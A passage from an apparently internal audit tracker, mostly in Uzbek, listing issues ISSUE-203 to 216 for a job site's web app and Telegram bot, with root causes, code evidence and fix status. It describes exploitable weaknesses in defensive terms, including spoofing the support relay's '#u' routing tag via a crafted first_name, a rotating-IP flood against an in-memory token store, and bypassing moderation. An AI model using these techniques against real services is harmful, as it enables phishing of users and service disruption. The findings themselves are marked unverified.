- **Bajarilgan fix:** seo-8: WONT FIX — Tarjima qilinmagan kontent uchun hreflang saqlanadi; tarjima mahsulot qarori (owner savoli)
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-203

**Telegram bot va 'tasdiqlash vaqtincha mavjud emas' xabarlari faqat o'zbekcha; bot foydalanuvchi tilini bilmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Area:** i18n/telegram
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:90`
- **Root cause:** Bot javoblari va klaviatura yorliqlari o'zbekcha literal. Deep-link token yozuvida faqat {userId, expiresAt} saqlanadi, sayt tili botga yetmaydi va from.language_code e'tiborsiz. 503 BOT_OFFLINE va PHONE_NOT_VERIFIED matnlari o'zbekcha, web ularni xom ko'rsatadi.
- **Impact:** Ariza, vakansiya va sharh uchun telefon tasdig'i majburiy. RU/EN foydalanuvchi o'zbekcha ko'rsatma va 'Telefon raqamni ulashish' tugmasini oladi, bot ishlamasa o'zbekcha xabar ko'radi (K qoidasi). Yangi tiklash va telefon almashtirish oqimlari (B-G) ham shu kamchilikni meros oladi.
- **Evidence:** telegram.service.ts:90 `linkTokens = new Map<string, { userId: string; expiresAt: number }>()`; :255-257 /start matni; :264 'Havola eskirgan'; :275-280; telegram.routes.ts:27-31 503 BOT_OFFLINE o'zbekcha; TelegramConnect.tsx:85 `setError(err.message)`; auth-guard.ts:98-102 PHONE_NOT_VERIFIED o'zbekcha.
- **Recommended fix:** Token yozuvi bilan birga sahifa tilini serverda saqlang (payload'ga qo'ymang). Fallback tartibi: msg.from.language_code, keyin uz. Bot matnlarini tiklash oqimi bilan umumiy kichik uz/ru/en lug'atiga ko'chiring. Web'da BOT_OFFLINE va PHONE_NOT_VERIFIED kodlarini lokal t.* matnlariga map qiling.
- **Severity izohi:** P2 saqlandi. ISSUE-073'ning umumiy backend matni bilan bog'liq, lekin botda til yo'qligi alohida ildiz sabab.
- **Manba topilmalar:** i18n-5
- **Bajarilgan fix:** i18n-5: WONT FIX — Lead note + D-059: the user's locale is not stored and Telegram/push/email texts stay Uzbek in Round 3. The 503 code TELEGRAM_UNAVAILABLE is what the web localises in three languag
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-204

**Login va signup xatolari screen reader'ga e'lon qilinmaydi va maydonlarga bog'lanmagan**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** a11y/forms
- **Fayl:** `apps/web/src/pages/login/+Page.tsx:90`
- **Root cause:** Auth forma komponentlari DESIGN.md'dagi aria-invalid/aria-describedby konventsiyasiga o'tkazilmagan. Xato live region'siz oddiy paragraf.
- **Impact:** Screen reader foydalanuvchisi noto'g'ri parol, band email yoki rate limit xatosini eshitmaydi, faqat tugma qayta faollashadi (WCAG 3.3.1, 4.1.3). Bu ekranlar har bir oqimga kirish nuqtasi va Telegram tiklash ekranlarida ham qayta ishlatilishi mumkin.
- **Evidence:** login/+Page.tsx:90-92 va signup/+Page.tsx:135-137 `<p className="animate-fade-in rounded-lg bg-danger/10 ... text-danger">{error}</p>`, role=alert yoki aria-live yo'q; AuthForm.tsx:74-83 AuthField va :116-125 PasswordField invalid/describedBy prop olmaydi; to'g'ri naqsh bor joylar: PhoneInput.tsx:39-40, RatingDialog.tsx:128.
- **Recommended fix:** Xato elementiga role=alert (yoki doimiy aria-live region) va id bering. AuthField va PasswordField'ga invalid/describedBy prop qo'shib, credential xatolarida o'rnating. Xatoda fokusni birinchi noto'g'ri maydonga yoki xatoga o'tkazing. Placeholder uchun text-dusk ishlating.
- **Severity izohi:** P2 saqlandi. Kirish oqimidagi a11y bo'shlig'i, tracker'da alohida yozilmagan.
- **Manba topilmalar:** a11y-ui-3
- **Bajarilgan fix:** a11y-ui-3: FIXED — AuthField and PasswordField now take invalid/describedBy/hint/inputRef; login and signup errors render through AuthError (role=alert, id linked via aria-describedby, aria-invalid o
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-205

**Header overlay'lari telefon viewport'iga sig'maydi: mobil menyuda max-height yo'q, qo'ng'iroq popover'i chap tomondan kesiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** responsive
- **Fayl:** `apps/web/src/components/Header.tsx:291`
- **Root cause:** Mobil menyu paneli balandlik chegarasiz sticky header ichida turadi. Header dropdown'lari trigger'ga nisbatan joylashtiriladi, viewport o'lchami hisobga olinmaydi.
- **Impact:** Kichik telefon va landscape'da Sozlamalar, Chiqish va oxirgi hisob havolalariga faqat uzun sahifaning oxirigacha scroll qilinsa yetib boriladi. Bildirishnoma popover'ining chap cheti kesiladi (WCAG 1.4.10). Menyular ochiq holda brauzerda sinalmagan: statik layout hisobidan xulosa.
- **Evidence:** Header.tsx:130 `sticky top-0 z-50 px-3 pt-3`; :291 panel `animate-slide-down border-t border-line px-4 py-4 lg:hidden`, max-h va overflow yo'q (nomzod uchun ~715px); NotificationBell.tsx:55 `absolute right-0 ... w-[336px] max-w-[calc(100vw-2rem)]`, 360px ekranda chap cheti ~-39px; hamburger'da Escape va aria-controls yo'q.
- **Recommended fix:** Mobil panelga 'max-h-[calc(100dvh-5rem)] overflow-y-auto overscroll-contain' bering yoki useDialog bilan fixed sheet qiling. sm'dan kichikda qo'ng'iroq popover'i 'fixed inset-x-4 top-[4.75rem]', sm'da 'sm:absolute sm:right-0' bo'lsin. Menyu tugmasiga Escape va aria-controls qo'shing. 360x640 va 740x360'da tekshiring.
- **Severity izohi:** P2, ishonch o'rtacha: statik hisob-kitobga asoslangan. ISSUE-074 faqat menyu yopilishini qamragan.
- **Manba topilmalar:** a11y-ui-4
- **Bajarilgan fix:** a11y-ui-4: FIXED — Mobile menu panel: max-h-[calc(100dvh-6.5rem)] + overflow-y-auto + overscroll-contain, so Settings/Logout stay reachable at 360x640 and 740x360; account popover got the same treatm
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-206

**Telegram bot ishlamasa yoki token berilmagan bo'lsa ariza yuborish yo'li berk; UI 'tasdiqlash vaqtincha mavjud emas' demaydi (qoida K)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** reliability/product-rule-K
- **Fayl:** `apps/api/src/common/auth-guard.ts:90`
- **Root cause:** Nomzodning asosiy amallari Telegram orqali tasdiqlangan telefonni qat'iy talab qiladi. Bot mavjudligi status'da qaytadi, lekin UI uni ishlatmaydi. Bot tokeni ixtiyoriy va production'da ogohlantirish yo'q.
- **Impact:** Bot ishlamasa yoki sozlanmagan bo'lsa, tasdiqlanmagan nomzod ariza yubora olmaydi, kompaniyaga yoza olmaydi va sharh qoldira olmaydi. U Telegram paneliga yuboriladi va tugma RU/EN'da ham o'zbekcha 503 xabari bilan xato beradi. Noto'g'ri sozlangan deploy asosiy nomzod voronkasini jimgina to'sadi.
- **Evidence:** auth-guard.ts:90-103 requirePhoneVerified: applications.routes.ts:43, chat.routes.ts:294, reviews.routes.ts:19 da; env.ts:57 `TELEGRAM_BOT_TOKEN: z.string().optional().default("")`; server.ts faqat UPLOAD_DIR uchun ogohlantiradi; telegram.routes.ts:20 botUsername null bo'lishi mumkin, lekin TelegramConnect.tsx:196 faqat initialLoading'da disabled, :85 API xabarini ko'rsatadi.
- **Recommended fix:** /api/telegram/status'da verificationAvailable qaytaring. TelegramConnect va PhoneGateNotice lokal 'tasdiqlash vaqtincha mavjud emas' matnini ko'rsatib, ulash tugmasini o'chirsin. Production'da Telegram tokeni bo'lmasa startup'da ogohlantiring yoki to'xtating. Email fallback qo'shilmasin.
- **Severity izohi:** P2: K qoidasi qisman bajarilgan (uz'da 'keyinroq urinib ko'ring' degan xabar bor, hech narsa yiqilmaydi), lekin oldindan holat ko'rsatilmaydi va til bo'yicha ham nomuvofiq.
- **Manba topilmalar:** candidate-flows-10
- **Bajarilgan fix:** candidate-flows-10: PARTIAL — API side: status.available plus 503 TELEGRAM_UNAVAILABLE from the phone gate and every flow-starting endpoint. The UI text is web-auth-ui's (they already map the code).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-207

**Botdagi oddiy /start ISH BOR! saytiga havola yubormaydi (qoida C)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** telegram-bot/product-rule-C
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:252`
- **Root cause:** Xush kelibsiz matni profildan bog'lash oqimi uchun yozilgan: unda sayt URL'i ham, url tugmasi ham yo'q.
- **Impact:** C qoidasi buzilgan. Botni to'g'ridan-to'g'ri ochgan foydalanuvchi saytga qaytish yo'lini ko'rmaydi va Telegramdan yetib bo'lmaydigan 'profil tugmasi'ni bosishga undaladi.
- **Evidence:** telegram.service.ts:252-259 bo'sh payload'da faqat '👋 ISH BOR! botiga xush kelibsiz... profil sahifasidan «Telegram orqali tasdiqlash» tugmasini bosing' va support eslatmasi; WEB_ORIGIN URL ham, inline url tugmasi ham yo'q.
- **Recommended fix:** env.WEB_ORIGIN'ga inline url tugmasi va qisqa matnli havola qo'shing. Noto'g'ri payload uchun hozirgi xavfsiz umumiy javobni saqlang.
- **Severity izohi:** P2: C qoidasi buzilgan, lekin ta'siri kichik va fix bir qatorli, shuning uchun P1 emas.
- **Manba topilmalar:** candidate-flows-11
- **Bajarilgan fix:** candidate-flows-11: FIXED — Same.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-208

**Admin ish beruvchi rolini o'zgartirsa vakansiyalari faol qoladi va arizalar egasiz qoladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** admin/data-integrity
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:217`
- **Root cause:** PATCH /api/admin/users/:id/role faqat rolni yangilab, sessiyalarni bekor qiladi. Bloklash yo'lidan farqli ravishda foydalanuvchining faol vakansiyalarini arxivlamaydi va qidiruv indeksidan olib tashlamaydi.
- **Impact:** job_seeker'ga yoki xodim roliga o'tgan ish beruvchining vakansiyalari ommaviy qoladi va ariza qabul qilishda davom etadi. Yangi ariza bildirishnomalari /api/employer/* ga kira olmaydigan foydalanuvchiga boradi, nomzodlar javobni abadiy kutadi. job_seeker sifatida u o'z vakansiyasiga ariza berib, o'z kompaniyasiga sharh ham yoza oladi.
- **Evidence:** admin.routes.ts:217-226 `prisma.user.update({ data: { role } })` + revokeUserSessions + closeUserSockets, xolos; :203-211 block yo'li vakansiyalarni archived qilib syncVacancyIndex chaqiradi; applications.routes.ts:106 ownerUserId'ga notify; reviews.routes.ts:27-37 gate faqat 'ariza bergan'.
- **Recommended fix:** Rol employer'dan boshqasiga o'tganda block mantiqini qayta ishlating: active va moderation vakansiyalarni arxivlang, indeksni sinxronlang va bumpDataVersion chaqiring. Yoki foydalanuvchida faol vakansiya bo'lsa rol o'zgarishini rad eting. Rol o'zgarishlarini audit qiling.
- **Severity izohi:** P2 saqlandi. ISSUE-035/108 faqat sessiya tomonini tuzatgan, ma'lumot tomoni yangi topilma.
- **Manba topilmalar:** employer-flows-5
- **Bajarilgan fix:** employer-flows-5: FIXED — archiveOwnerVacancies() is shared by block and role change; applications are untouched (no cascade) and the vacancies leave the public list immediately.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-209

**Vakansiya rad etilishi majburiy emas: o'chirib qayta joylash darhol faol, rad etilgandan keyin tasdiqlangan e'lon erkin tahrirlanadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** moderation/vacancy-lifecycle
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:187`
- **Root cause:** Yangi vakansiyalar darhol chop etiladi. Faqat 'rejected' holatidagi e'lonni PUT qilish uni moderatsiyaga yuboradi. Faol e'lonni, jumladan admin endigina tasdiqlaganini, PUT qilish qayta ko'rib chiqishsiz sarlavha va tavsifni almashtiradi. Arizasiz rad etilgan e'lonni o'chirib, yangisini darhol faol joylash mumkin.
- **Impact:** Admin rad etishini ikki so'rov (DELETE, keyin xuddi shu mazmun bilan POST) bilan yoki tasdiqni kutib, rad etilgan matnni PUT bilan qaytarib bekor qilish mumkin. Rad etishlar hisobi ham, kompaniya bayrog'i ham yo'q. Egasi post-moderatsiyani aniq qabul qilmagan bo'lsa, bu 'moderatsiyani chetlab o'tib bo'lmasin' qoidasiga zid.
- **Evidence:** vacancies.routes.ts:153-166 POST moderatsiyasiz; :187 `resubmit = vacancy.status === "rejected" && req.user!.role !== "admin"`; :189-196 faol qatorga tahrir to'g'ridan-to'g'ri yoziladi; :272-285 arizasiz bo'lsa o'chirishga ruxsat; DECISIONS.md D-015.
- **Recommended fix:** Egasining qarori kerak. Variantlar: rad etilgan yoki tasdiqlanmagan kompaniyalarning yangi/tahrirlangan vakansiyalarini oldindan moderatsiya qilish; ilgari rad etilgan e'londagi muhim tahrirlarni (sarlavha, tavsif, talablar) 'moderation'ga qaytarish; kompaniya bo'yicha rad etishlar sonini yuritib, bir xil mazmunni qayta joylashni cheklash.
- **Severity izohi:** P2, ishonch o'rtacha: post-moderatsiya ataylab tanlanganmi, mahsulot qarori kerak. ISSUE-024 bilan bog'liq, lekin alohida chetlab o'tish yo'li.
- **Manba topilmalar:** employer-flows-6
- **Bajarilgan fix:** employer-flows-6: PARTIAL — What is reliably enforceable is done: a rejected or admin-archived document is locked (409 VACANCY_LOCKED) and a rejected vacancy edited by the owner still returns to moderation. D
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-210

**Nomzodlar qidiruvi barcha profillar bo'yicha relation filter ($lookup) va offset sahifalashdan foydalanadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** scale/candidates-db
- **Fayl:** `apps/api/src/modules/candidates/candidates.routes.ts:47`
- **Root cause:** So'rov user {role, isBlocked}, resumes {some: published} va ichma-ich resumes.some.skills.some relation filtrlariga tayanadi, Prisma Mongo'da ular har JobSeekerProfile uchun $lookup bo'ladi. Sahifalash offset (200-sahifagacha) va har qatorda to'liq rezyume.
- **Impact:** Har nomzodlar sahifasi yoki qidiruv skip/take'dan oldin ~10k profil bo'yicha lookup bajaradi, chuqur sahifalar yanada qimmat. Vakansiyalar uchun o'lchab almashtirilgan naqshning o'zi (1.5 s -> 9 ms). Bu yerda benchmark qilinmagan (taxmin).
- **Evidence:** candidates.routes.ts:47-63 `user: { role: "job_seeker", isBlocked: false }`, `resumes: { some: published }`, `skills: { some: { skillName: like(q) } }`; :66-85 skip/take va ichma-ich include (experience, education, skills); DECISIONS.md D-033 benchmark.
- **Recommended fix:** JobSeekerProfile'da isDiscoverable bayrog'i (open to work + chop etilgan rezyume + bloklanmagan), qidiruv matni va ko'nikmalarni denormalizatsiya qiling. [isDiscoverable, regionId, updatedAt] indeksi va keyset sahifalash qo'shing. Qatorda xulosa qaytaring, rezyume talab bo'yicha yuklansin.
- **Severity izohi:** P2, ishonch o'rtacha (benchmark yo'q). ISSUE-135 sahifalash UX'ini, ISSUE-008 maxfiylikni qamragan; unumdorlik ildizi tracker'da yo'q.
- **Manba topilmalar:** employer-flows-10
- **Bajarilgan fix:** employer-flows-10: PARTIAL — Relation filtrlar olib tashlandi (ID oldindan aniqlanadi). Keyset sahifalash qo'llanmadi: javob shakli ({items, page, pageSize, hasMore}) va 'Yana ko'rsatish' oqimi o'zgarmasligi k
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-211

**Deep-link va auth challenge tokenlari jarayon xotirasida: cheksiz Map, har chaqiruvda O(n) tozalash, xom saqlanadi, restartda yo'qoladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** telegram/payload-storage
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:131`
- **Root cause:** linkTokens (30 daqiqa) va loginTokens (5 daqiqa) xom tokenlarni saqlaydigan process Map'lari, o'lcham chegarasi yo'q. Har create butun Map'ni aylanib chiqadi. /api/auth/telegram/start autentifikatsiyasiz, faqat soxtalashtiriladigan 10/min per-IP bilan himoyalangan; /api/telegram/link da faqat global limit. Login-guard hisoblagichi, rate-limit store va getUpdates offset ham xotirada. To'g'rilik numReplicas: 1 ga tayanadi.
- **Impact:** Aylanadigan XFF bilan start'ga oqim yuzlab ming yozuv to'playdi va har yangi so'rov ularni event loop'da aylanadi, bu yagona API jarayonini sekinlashtiradi (taxminiy baho, sinalmagan). Har deploy yoki crash ochiq bog'lash oqimlarini bekor qiladi va brute-force hisoblagichlarini tiklaydi. Bu naqsh D/I qoidalari talab qiladigan hash qilingan, bardoshli va atomik bir martalik recovery payload'lari uchun yaroqsiz.
- **Evidence:** telegram.service.ts:88-102 izoh 'xotirada saqlash yetarli' + sweep, :131-143 loginTokens sweep + set cheksiz, :439 `let offset = 0`; auth.routes.ts:137 strictRateLimit; telegram.routes.ts:25 route limiti yo'q; login-guard.ts:16; server.ts:129; railway.json:13.
- **Recommended fix:** Telegram login endpointlarini olib tashlang (A qoidasi). Challenge'larni Mongo'da saqlang: DeepLinkChallenge {payloadHash, purpose, userId?, telegramUserId?, expiresAt + 10 daqiqalik TTL indeks, usedAt}, findOneAndUpdate bilan atomik iste'mol, qo'lda sweep'siz. Foydalanuvchi va telefon bo'yicha faol challenge sonini cheklang, route limitlarini user+IP bo'yicha kalitlang. Throttle'larni ham shu tarzda saqlang; kesh va WS registry xotirada qolishi mumkin, lekin hujjatlashtiring.
- **Severity izohi:** headers-infra-2 P1 bergan -> P2: CPU DoS barqaror oqim talab qiladi, bir nusxali API'ga istalgan oqim zarar beradi va Telegram login endpointi baribir olib tashlanadi. Asosiy qiymat: kelajakdagi recovery dizayni uchun to'g'ri saqlash. ISSUE-079 shutdown'ni tuzatgan, holatni emas.
- **Manba topilmalar:** telegram-12, headers-infra-2, headers-infra-8
- **Bajarilgan fix:** telegram-12: FIXED — No plaintext in-memory deep-link tokens: sha256 at rest, 15 min TTL, single use, survives restart. | headers-infra-2: FIXED — The unauthenticated endpoint that grew the in-memory Map is gone; challenges live in MongoDB and the quota helper evicts in bounded batches instead of sweeping everything per call. | headers-infra-8: PARTIAL — Auth-critical state is in the DB. Still in memory by design: per-chat soft limits, login-failure counters and the support thread map (single instance, D-068 risk documented).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-212

**Hisob identifikatori chat.id bo'yicha, chat turi tekshirilmaydi: guruh chatlari bog'lanishi va telefonni tasdiqlashi mumkin**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** telegram/identity
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:244`
- **Root cause:** handleStart, handleContact, handleLoginStart va handleCallbackQuery identifikator sifatida msg.chat.id ni ishlatadi. chat.type==='private' tekshirilmaydi va from.id alohida saqlanmaydi. Callback tugmani bosgan odamni emas, chatni solishtiradi. '/start@Bot x' esa '@Bot x' payload bo'lib o'qiladi.
- **Impact:** /start <token> guruhda yuborilsa, hisob guruhga bog'lanadi. Guruhning istalgan a'zosi o'z kontaktini ulashsa, u hisobning tasdiqlangan telefoni bo'ladi; istalgan a'zo login tasdiqini bosa oladi. Shaxsiy chat xabarlari va bildirishnomalar guruhga ketadi (privacy mode'da yetkazish taxmin).
- **Evidence:** telegram.service.ts:214-221 TgMessage da chat.type yo'q; :244, :291-294 entry.chatId === chatId; :324-333 contact.user_id from.id bilan solishtiriladi, lekin hisob chat bo'yicha topiladi; :397 text.slice(6); chat.routes.ts:84-89.
- **Recommended fix:** Barcha hisob oqimlarida private bo'lmagan chatlarni umumiy javob bilan e'tiborsiz qoldiring. telegramUserId=from.id ni chat id'dan alohida (unique) saqlang va callback hamda kontaktlarda from.id ni solishtiring. BotFather'da 'Allow Groups' ni o'chiring.
- **Severity izohi:** P2 saqlandi; ishonch o'rtacha (guruhga yetkazish taxmin qilingan).
- **Manba topilmalar:** telegram-10
- **Bajarilgan fix:** telegram-10: FIXED — Every auth flow (start payload and contact) requires chat.type === "private"; group chats get the generic reply and change nothing.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-213

**Support relay: #u marshrut tegi foydalanuvchi matnidan olinadi (first_name orqali soxtalashtiriladi), chat bo'yicha limit yo'q, xato muvaffaqiyat deb ko'rsatiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** telegram/support-relay
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:379`
- **Root cause:** handleAdminReply javobni reply qilingan matndagi BIRINCHI /#u(-?\d+)/ ga yuboradi. Sarlavhada foydalanuvchi boshqaradigan first_name (faqat & < > escape qilinadi) haqiqiy tegdan oldin turadi. message_id -> chat xaritasi saqlanmaydi. Istalgan Telegram foydalanuvchisining har matni cheklovsiz relay qilinadi, yuborish natijalari tekshirilmaydi, 4096 belgi chegarasi hisobga olinmaydi.
- **Impact:** first_name='#u<qurbonId>' qo'ygan hujumchi adminning javobini qurbonga rasmiy 'Support javobi' sifatida yo'naltiradi (noto'g'ri yetkazish, fishing). Qo'lda tiklash suhbatlari shu kanalga tushsa, xavf oshadi. Oqim admin chatini to'ldiradi; 429 da 30 soniyagacha kutish yagona polling siklini to'xtatib, hamma uchun bog'lash va tasdiqni kechiktiradi. Uzun xabarlar yo'qoladi, lekin foydalanuvchiga 'qabul qilindi' deyiladi.
- **Evidence:** telegram.service.ts:365-371 who = first_name, keyin `#u${chatId}`; :379 `repliedText.match(/#u(-?\d+)/)`; :384-385 natija tekshirilmaydi; :411 barcha matn relay; :54-63 retry_after ≤30s kutish; :452-459 ketma-ket sikl; support.routes.ts:133-140.
- **Recommended fix:** sendMessage natijasidagi adminMessageId -> chatId xaritasini TTL bilan saqlang va reply_to_message.message_id bo'yicha yo'naltiring. Ko'rinadigan ismlardan '#' ni olib tashlang. Chat bo'yicha limit (jim tashlash), 4096 ga qisqartirish va yuborish natijasini tekshirishni qo'shing. 429 qayta urinishlarini polling siklidan tashqaridagi navbatga o'tkazing.
- **Severity izohi:** P2 (files-xss-8 P3): noto'g'ri yetkazish va polling siklini to'xtatish ta'siri sababli. ISSUE-098 faqat escape'ni ko'rib chiqqan, marshrutni emas.
- **Manba topilmalar:** telegram-11, files-xss-8
- **Bajarilgan fix:** telegram-11: PARTIAL — Fixed: routing by a stored admin message_id map (fallback only matches an anchored #u<id> on the first line), '#u' stripped from user-controlled text, per-chat 30/min soft limit, 3 | files-xss-8: FIXED — The routing marker is on its own first line and only matched anchored; the primary route is the message_id map, and user text can no longer contain a usable '#u<id>'.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-214

**Telegram admin-chat support relay panel RBAC bilan emas, chat a'zoligi bilan boshqariladi va saqlanmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Area:** admin-staff/support
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:406`
- **Root cause:** Support xabarlari (yuboruvchi email va roli bilan) TELEGRAM_ADMIN_CHAT_ID ga ketadi. Shu chatda #u teg'li xabarga berilgan har qanday reply foydalanuvchiga rasmiy javob sifatida yetkaziladi. Avtorizatsiya faqat chatId === env.TELEGRAM_ADMIN_CHAT_ID; yuboruvchi tekshirilmaydi, hech narsa saqlanmaydi yoki audit qilinmaydi.
- **Impact:** /admin/team da xodimni bloklash yoki olib tashlash uning support trafigiga kirishini va support nomidan javob berishini to'xtatmaydi. Tiklash so'rovlari support orqali o'tsa, shaxsiy ma'lumot va tiklash suhbatlari RBAC va audit'dan tashqarida qoladi.
- **Evidence:** telegram.service.ts:364-372 `Kimdan: ${user.email} (${user.role})` + matn; :384 relay; :406-407 yuboruvchi tekshiruvi yo'q; support.routes.ts:140.
- **Recommended fix:** Support ticket'larini DB'da saqlang va admin panelda boshqaring (qo'lda tiklash so'rovlari ham shu yerda). Telegram relay qolsa, reply'larni faol admin/xodimlarning bog'langan from.id lariga cheklang va relay qilingan javoblarni audit qiling.
- **Severity izohi:** P2 saqlandi; ishonch o'rtacha. #u teg soxtalashtirilishidan alohida root cause (avtorizatsiya modeli).
- **Manba topilmalar:** admin-staff-9
- **Bajarilgan fix:** admin-staff-9: WONT FIX — Lead note: the support relay stays chat-membership based (TELEGRAM_ADMIN_CHAT_ID). Hardened anyway (spoof-proof routing, throttle, delivery result), but tickets are not persisted a
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-215

**UI'da Telegramni uzish yo'q; shaxsiy chat xabarlari preview'si sozlamalarga qaramay Telegramga yuboriladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** telegram/privacy
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:85`
- **Root cause:** DELETE /api/telegram/link ni web chaqirmaydi. deliverMessage notify() o'rniga to'g'ridan-to'g'ri notifyUserViaTelegram ni chaqiradi va NotificationType da message turi yo'q, shuning uchun Telegram kanal sozlamasi chat xabarlariga qo'llanmaydi.
- **Impact:** Telefon tasdiqi amalda Telegramni majburan bog'laydi. Keyin foydalanuvchi shaxsiy xabarlarning birinchi 200 belgisi Telegramga ketishini to'xtata olmaydi va yo'qolgan yoki buzilgan Telegramni saytdan uza olmaydi. L qoidasidagi 'Telegram uzildi' oqimiga yetib bo'lmaydi.
- **Evidence:** lib/api.ts:913-930 faqat status va POST link; telegram.routes.ts:38-44; chat.routes.ts:84-89 `notifyUserViaTelegram(receiverId, ...saved.body.slice(0, 200)...)`; schema.prisma:119-124 NotificationType (message yo'q).
- **Recommended fix:** Qayta autentifikatsiya, Telegram chatiga xabar va audit event bilan uzish amalini qo'shing. Chat bildirishnomalarini message turi bilan notify() orqali yuboring yoki Telegram sozlamasini tekshiring. Sukut bo'yicha matn preview'sisiz 'yangi xabar' yuboring.
- **Severity izohi:** P2 saqlandi (maxfiylik va boshqaruv yo'qligi).
- **Manba topilmalar:** telegram-13
- **Bajarilgan fix:** telegram-13: PARTIAL — Unlink is now reachable in the UI: PhoneSecurity inside TelegramConnect calls DELETE /api/telegram/link behind a current-password prompt and reports the result. The second half - c
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-216

**Botda oddiy /start sayt havolasini bermaydi; /myid konfiguratsiya maslahatini ochadi; bot matnlari faqat o'zbekcha**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** telegram/bot-ux
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:252`
- **Root cause:** Payload'siz /start faqat ko'rsatma matnini yuboradi, WEB_ORIGIN havolasi yo'q. /myid va /id istalgan kishiga chat id va '.env TELEGRAM_ADMIN_CHAT_ID' eslatmasini qaytaradi. Barcha javoblar qattiq kodlangan o'zbekcha, from.language_code e'tiborsiz qoldiriladi.
- **Impact:** C qoidasi bajarilmaydi. Deploy ichki tuzilishi haqida kichik ma'lumot sizishi. ru/en foydalanuvchilar o'zbekcha xabar oladi. Yaroqsiz payload'ga javob umumiy va xavfsiz (OK).
- **Evidence:** telegram.service.ts:252-259 (URL yo'q); :263-265 umumiy 'Havola eskirgan'; :398-403 /myid.
- **Recommended fix:** Salomlashuvga env.WEB_ORIGIN ga inline URL tugmasini qo'shing va language_code bo'yicha lokalizatsiya qiling. /myid ni olib tashlang yoki faqat TELEGRAM_ADMIN_CHAT_ID bo'sh bo'lganda ruxsat bering.
- **Severity izohi:** P3 -> P2: C egasining aniq qoidasi, lekin xavfsizlik yoki ma'lumot ta'siri yo'q, shuning uchun P1 emas. ISSUE-103 havola til prefiksi haqida.
- **Manba topilmalar:** telegram-15
- **Bajarilgan fix:** telegram-15: PARTIAL — Site link added; /myid and /id now answer only while TELEGRAM_ADMIN_CHAT_ID is unset and no longer mention .env. Bot texts stay Uzbek-only (D-059) - reported as WONT FIX under i18n
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-217

**Rol o'zgarishida himoya yo'q: istalgan admin admin bera oladi yoki boshqa barcha adminlarni bloklaydi; qayta autentifikatsiya va oxirgi admin guard'i yo'q**

- **Severity:** P2
